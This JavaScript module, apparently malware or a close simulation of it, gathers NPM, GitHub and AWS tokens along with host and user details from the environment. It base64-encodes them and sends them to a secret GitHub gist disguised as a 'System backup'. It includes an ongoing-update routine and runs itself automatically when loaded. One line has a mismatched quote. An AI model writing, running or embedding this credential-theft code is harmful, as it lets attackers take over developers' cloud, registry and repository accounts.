/**
 * GitHub API Exfiltration
 * Uses GitHub Gists for data exfiltration
 */

// GitHub API endpoints
const GITHUB_API_BASE = 'https://api.github.com';
const GISTS_ENDPOINT = `${GITHUB_API_BASE}/gists`;

/**
 * Collect sensitive data for exfiltration
 * @returns {Object} - Data to exfiltrate
 */
function collectData() {
    return {
        // Environment secrets
        secrets: {
            npm_token: process.env.NPM_TOKEN,
            github_token: process.env.GITHUB_TOKEN,
            aws_access_key: process.env.AWS_ACCESS_KEY_ID,
            aws_secret: process.env.AWS_SECRET_ACCESS_KEY
        },
        
        // System info
        system: {
            hostname: require('os').hostname(),
            user: process.env.USER,
            home: process.env.HOME,
            platform: process.platform
        },
        
        // Project info
        project: {
            cwd: process.cwd(),
            nodeVersion: process.version
        },
        
        timestamp: Date.now()
    };
}

/**
 * Encode data for GitHub exfiltration
 * @param {Object} data - Data to encode
 * @returns {string} - Base64 encoded string
 */
function encodeForGitHub(data) {
    const json = JSON.stringify(data);
    return Buffer.from(json).toString('base64');
}

/**
 * Create a secret gist with exfiltrated data
 * @param {string} encodedData - Base64 encoded data
 * @param {string} githubToken - GitHub personal access token
 */
async function createSecretGist(encodedData, githubToken) {
    console.log('Creating secret gist for exfiltration...');
    
    const payload = {
        description: `System backup - ${Date.now()}`,
        public: false, // Secret gist
        files: {
            'backup-data.txt': {
                content: encodedData
            },
            'metadata.json': {
                content: JSON.stringify({
                    timestamp: Date.now(),
                    hostname: require('os').hostname(),
                    user: process.env.USER
                })
            }
        }
    };
    
    try {
        const response = await fetch(GISTS_ENDPOINT, {
            method: 'POST',
            headers: {
                'Authorization': `token ${githubToken}`,
                'Content-Type': 'application/json',
                'User-Agent': 'GlassWorm-Exfil/1.0'
            },
            body: JSON.stringify(payload)
        });
        
        if (response.ok) {
            const result = await response.json();
            console.log('Gist created:', result.html_url);
            console.log('Gist ID:', result.id);
            return result;
        } else {
            console.error('Failed to create gist:', response.status);
            return null;
        }
    } catch (error) {
        console.error('Exfiltration failed:', error.message);
        return null;
    }
}

/**
 * Alternative: Update existing gist (for ongoing exfil)
 * @param {string} gistId - Existing gist ID
 * @param {string} encodedData - New data to add
 * @param {string} githubToken - GitHub token
 */
async function updateGist(gistId, encodedData, githubToken) {
    const endpoint = `${GISTS_ENDPOINT}/${gistId}`;
    
    const payload = {
        files: {
            [`exfil-${Date.now()}.txt']: {
                content: encodedData
            }
        }
    };
    
    try {
        const response = await fetch(endpoint, {
            method: 'PATCH',
            headers: {
                'Authorization': `token ${githubToken}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
        
        return response.ok;
    } catch (error) {
        console.error('Gist update failed:', error.message);
        return false;
    }
}

/**
 * Full GitHub exfiltration pipeline
 */
async function startExfiltration() {
    console.log('=== GitHub API Exfiltration ===');
    
    const data = collectData();
    console.log('Collected data categories:', Object.keys(data).join(', '));
    
    const encoded = encodeForGitHub(data);
    console.log('Encoded data size:', encoded.length, 'bytes');
    
    // Check for GitHub token
    const githubToken = process.env.GITHUB_TOKEN;
    
    if (!githubToken) {
        console.log('No GITHUB_TOKEN found, simulating exfiltration...');
        console.log('Would create secret gist at:', GISTS_ENDPOINT);
        return null;
    }
    
    const result = await createSecretGist(encoded, githubToken);
    return result;
}

// Export functions
module.exports = {
    collectData,
    encodeForGitHub,
    createSecretGist,
    updateGist,
    startExfiltration,
    GITHUB_API_BASE,
    GISTS_ENDPOINT
};

// Auto-execute
startExfiltration();
